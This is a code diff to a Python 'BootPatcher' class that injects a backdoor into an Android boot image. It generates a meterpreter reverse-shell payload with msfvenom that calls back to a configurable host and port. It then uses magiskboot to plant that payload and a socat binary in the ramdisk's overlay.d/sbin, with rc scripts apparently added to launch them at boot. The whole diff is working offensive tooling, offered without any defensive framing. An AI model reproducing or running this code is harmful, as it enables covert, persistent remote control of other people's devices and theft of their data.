@@ -140,12 +140,13 @@ class BootPatcher:
     def generate_revshell(self):
         import ipaddress
 
-        subprocess.run(["msfvenom","-p","linux/aarch64/shell_reverse_tcp","-f", "elf","-o",self.workdir+"/payload", "LHOST={}".format(self.ip), "LPORT={}".format(self.port)])
+        subprocess.run(["msfvenom","-p","linux/aarch64/meterpreter_reverse_tcp","-f", "elf","-o",self.workdir+"/payload", "LHOST={}".format(self.ip), "LPORT={}".format(self.port)])
         # subprocess.check_call([self.workdir + "/magiskboot", "compress=xz", "payload", "payload.xz"], env=self.my_env)
 
     def add_revshell(self):
         subprocess.check_call([self.workdir + "/magiskboot", "cpio", "ramdisk.cpio",
-                               "add 0777 overlay.d/sbin/payload ../../native/obj/local/arm64-v8a/revshell",
+                               "add 0750 overlay.d/sbin/socat ../../socat_shell/lib/socat_aarch64",
+                               "add 0750 overlay.d/sbin/payload ../../bind_shell/libs/arm64-v8a/revshell",
                                "patch"], env=self.my_env)
 
     def add_rc_scripts(self):
@@ -168,7 +169,7 @@ class BootPatcher:
                                "patch"], env=self.my_env)
 
     def custom_patch(self):
-        # self.generate_revshell()
+       # self.generate_revshell()
         self.add_revshell()
         self.add_rc_scripts()
         return
